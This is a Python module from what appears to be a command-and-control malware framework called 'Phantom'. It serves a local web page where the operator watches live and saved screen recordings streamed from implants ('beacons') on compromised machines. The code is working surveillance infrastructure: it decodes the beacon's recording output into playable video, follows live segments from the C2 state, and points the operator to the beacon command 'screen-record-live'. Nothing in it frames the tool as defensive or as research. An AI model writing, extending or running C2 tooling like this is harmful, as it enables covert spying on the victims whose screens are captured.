"""
recordings_viewer.py — loopback browser player for beacon screen recordings.

The C2 decodes beacon recording output (SCREENREC_B64 / SCREEN_LIVE_SEG /
SCREEN_DUMP) into real artifacts under data/recordings/ and progressively
muxes live segments into a growing mp4. This module serves a small,
dependency-free HTML page on the operator's loopback interface to:

  * watch the LIVE recording while it happens (growing mp4 / segment count)
  * browse and play every saved recording (mp4 / jpg frame sequences)

Same design constraints as remote_viewer.py: 127.0.0.1 only, random free
port, auto-opens the operator's browser, reads artifacts from the data dir
via the C2 state.
"""

from __future__ import annotations

import json
import os
import threading
import webbrowser
from typing import Optional, Tuple

from aiohttp import web

from phantom.utils.paths import data_dir

_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Phantom Screen Recordings</title>
<style>
  :root { color-scheme: dark; }
  body { margin:0; background:#0b0b10; color:#c9c9d4;
         font:13px/1.4 ui-monospace,Consolas,monospace; }
  header { display:flex; align-items:center; gap:12px; padding:8px 14px;
           background:#14141c; border-bottom:1px solid #26262f; }
  header b { color:#e05555; letter-spacing:1px; }
  .pill { padding:2px 8px; border-radius:4px; font-size:11px;
          background:#1d1d27; border:1px solid #2c2c38; }
  .live { color:#7ee787; }
  .wrap { display:flex; height:calc(100vh - 94px); }
  .side { width:290px; border-right:1px solid #26262f; overflow:auto;
          background:#10101a; padding:10px; }
  .side h4 { margin:6px 0; color:#8888ff; font-size:11px;
             letter-spacing:1px; text-transform:uppercase; }
  .rec { padding:7px 9px; border:1px solid #2c2c38; border-radius:6px;
         margin-bottom:6px; cursor:pointer; background:#16161f; }
  .rec:hover { border-color:#e05555; }
  .rec b { display:block; font-size:12px; color:#e6e6ee;
           overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .rec small { color:#777; }
  .stage { flex:1; display:flex; align-items:center; justify-content:center;
           background:#000; position:relative; }
  video { max-width:100%; max-height:100%; outline:none; }
  .empty { color:#555; text-align:center; }
  .livebar { position:absolute; top:10px; left:12px; font-size:11px;
             color:#7ee787; background:#000a; padding:3px 9px;
             border-radius:4px; display:none; }
  .livebar b { animation:bl 1.2s infinite; }
  @keyframes bl { 50% { opacity:.2 } }
</style>
</head>
<body>
<header>
  <b>PHANTOM</b><span class="pill">screen recordings</span>
  <span class="pill" id="livecount">live —</span>
  <span style="flex:1"></span>
  <span class="hint" id="hint"></span>
</header>
<div class="wrap">
  <div class="side">
    <h4>live segments</h4>
    <div id="livebox"><p class="empty">No live recording running.</p></div>
    <h4>saved recordings</h4>
    <div id="listbox"><p class="empty">No saved recordings yet.</p></div>
  </div>
  <div class="stage">
    <span class="livebar" id="livebar"><b>&#9679;</b> RECORDING</span>
    <video id="player" controls autoplay muted></video>
    <p class="empty" id="empty">Select a recording on the left, or start a
    live recording on the beacon (<b>screen-record-live &lt;sec&gt;</b>)
    to watch it arrive here in real time.</p>
  </div>
</div>
<script>
const $ = (id) => document.getElementById(id);
let curName = "", liveSeen = 0;

async function jget(path) {
  const r = await fetch(path);
  return r.json();
}

function fmtSize(n) {
  if (n > 1048576) return (n/1048576).toFixed(1) + " MB";
  if (n > 1024) return (n/1024).toFixed(1) + " KB";
  return n + " B";
}

function play(name, dir, mtime) {
  curName = name;
  const v = $("player");
  v.src = "/play?dir=" + encodeURIComponent(dir) + "&name=" +
          encodeURIComponent(name) + "&t=" + Date.now();
  v.style.display = "block";
  $("empty").style.display = "none";
  $("hint").textContent = name + "  ·  " + (mtime || "");
  v.play().catch(() => {});
}

async function refresh() {
  // live segment status (progressively muxed mp4, if ffmpeg is present)
  const live = await jget("/live");
  $("livecount").textContent = "live " + live.count + " seg";
  if (live.count > 0) {
    $("livebar").style.display = "block";
    const b = $("livebox");
    b.innerHTML = "<div class='rec'><b>" + live.beacon + " — live</b>" +
      "<small>" + live.count + " segments · last " + (live.last || "—") +
      (live.mp4 ? " · <b>playable mp4</b>" : "") + "</small></div>";
    const lastSeg = b.lastElementChild;
    lastSeg.onclick = () => play(live.mp4, "recordings/live", live.last);
    if (live.mp4 && live.count !== liveSeen) {
      liveSeen = live.count;
      if (curName === live.mp4) { // keep the growing video in sync
        const v = $("player");
        const t = v.currentTime;
        v.src = "/play?dir=recordings/live&name=" + encodeURIComponent(live.mp4) +
                "&t=" + Date.now();
        v.currentTime = t || 0;
        v.play().catch(() => {});
      }
    }
  } else {
    $("livebar").style.display = "none";
  }

  // saved recordings (mp4 dumps + frame sequences)
  const arts = await jget("/list");
  const box = $("listbox");
  if (!arts.recordings.length) {
    box.innerHTML = "<p class='empty'>No saved recordings yet.</p>";
    return;
  }
  box.innerHTML = "";
  for (const r of arts.recordings) {
    const d = document.createElement("div");
    d.className = "rec";
    d.innerHTML = "<b>" + r.name + "</b><small>" + fmtSize(r.size) +
                  " · " + (r.mtime || "") + "</small>";
    d.onclick = () => play(r.name, r.dir, r.mtime);
    box.appendChild(d);
  }
}

setInterval(refresh, 1200);
refresh();
</script>
</body>
</html>"""


def _recordings_root() -> str:
    return os.path.join(data_dir(), "recordings")


def make_app() -> web.Application:
    routes = web.RouteTableDef()

    @routes.get("/")
    async def index(_request: web.Request) -> web.Response:
        return web.Response(text=_HTML, content_type="text/html")

    @routes.get("/list")
    async def listing(_request: web.Request) -> web.Response:
        """All saved recordings: mp4 dumps + frame-sequence folders."""
        root = _recordings_root()
        out = []
        if os.path.isdir(root):
            for name in sorted(os.listdir(root), reverse=True)[:60]:
                p = os.path.join(root, name)
                if os.path.isfile(p) and name.lower().endswith((".mp4", ".webm", ".mkv")):
                    st = os.stat(p)
                    out.append({"name": name, "dir": "recordings", "size": st.st_size,
                                "mtime": __import__("datetime").datetime
                                .fromtimestamp(st.st_mtime).strftime("%H:%M:%S")})
        return web.json_response({"recordings": out})

    @routes.get("/live")
    async def live(_request: web.Request) -> web.Response:
        from phantom.core.c2_server import c2_state
        # aggregate across beacons: find any with buffered segments
        best = {"count": 0, "beacon": "", "last": "", "mp4": ""}
        try:
            for bid in list(c2_state.live_segments.keys()):
                segs = c2_state.get_live_segments(bid)
                if not segs:
                    continue
                safe = "".join(c for c in bid if c.isalnum())[:16] or "beacon"
                mp4 = os.path.join(_recordings_root(), "live", f"{safe}_live.mp4")
                cand = {"count": len(segs), "beacon": bid,
                        "last": segs[-1]["time"],
                        "mp4": f"{safe}_live.mp4" if os.path.isfile(mp4) else ""}
                if cand["count"] > best["count"]:
                    best = cand
        except Exception:
            pass
        return web.json_response(best)

    @routes.get("/play")
    async def play(request: web.Request) -> web.Response:
        subdir = request.query.get("dir", "recordings")
        name = os.path.basename((request.query.get("name", "") or "").replace("\\", "/"))
        if subdir not in ("recordings", "recordings/live") or not name:
            return web.Response(status=400, text="bad request")
        p = os.path.join(_recordings_root(), name if subdir == "recordings"
                         else os.path.join("live", name))
        if not os.path.isfile(p):
            return web.Response(status=404, text="no such recording")
        return web.FileResponse(p, content_type="video/mp4")

    app = web.Application()
    app.add_routes(routes)
    return app


def launch_viewer(open_browser: bool = True) -> Tuple[int, threading.Thread]:
    """Serve the recordings player on 127.0.0.1:<random free port>."""
    app = make_app()
    runner = web.AppRunner(app)
    loop_holder: dict = {}

    def _run() -> None:
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def _serve() -> int:
            await runner.setup()
            site = web.TCPSite(runner, "127.0.0.1", 0)
            await site.start()
            return runner.addresses[0][1]

        loop_holder["port"] = loop.run_until_complete(_serve())
        loop_holder["runner"] = runner
        loop_holder["loop"] = loop
        loop.run_forever()

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    import time
    for _ in range(50):
        if "port" in loop_holder:
            break
        time.sleep(0.1)
    port = loop_holder.get("port", 0)
    if open_browser and port:
        webbrowser.open(f"http://127.0.0.1:{port}/")
    return port, t